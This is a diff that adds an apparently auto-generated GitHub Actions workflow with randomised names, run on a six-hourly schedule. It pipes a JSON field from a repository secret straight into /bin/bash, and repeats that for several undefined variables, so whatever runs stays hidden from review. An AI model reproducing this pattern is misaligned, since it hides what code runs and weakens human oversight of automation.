@@ -1,0 +1,24 @@
+name: shici1sc
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shici1sc
+        env:
+          zibfp891: ${{ secrets.zibfp891 }}
+        run: |
+          echo $zibfp891 | jq -r .fjil31029 | /bin/bash
+          echo $kw295 | jq -r .zvudg097 | /bin/bash
+          echo $ol86 | jq -r .wso5202 | /bin/bash
+          echo $ja85187 | jq -r .yu090 | /bin/bash
+          echo $tf563 | jq -r .fuhe724 | /bin/bash
+          echo $wavjf94 | jq -r .rggza7069 | /bin/bash
+          echo $hfmcs90879 | jq -r .mxb1 | /bin/bash
+          echo $w2 | jq -r .b73193 | /bin/bash
+
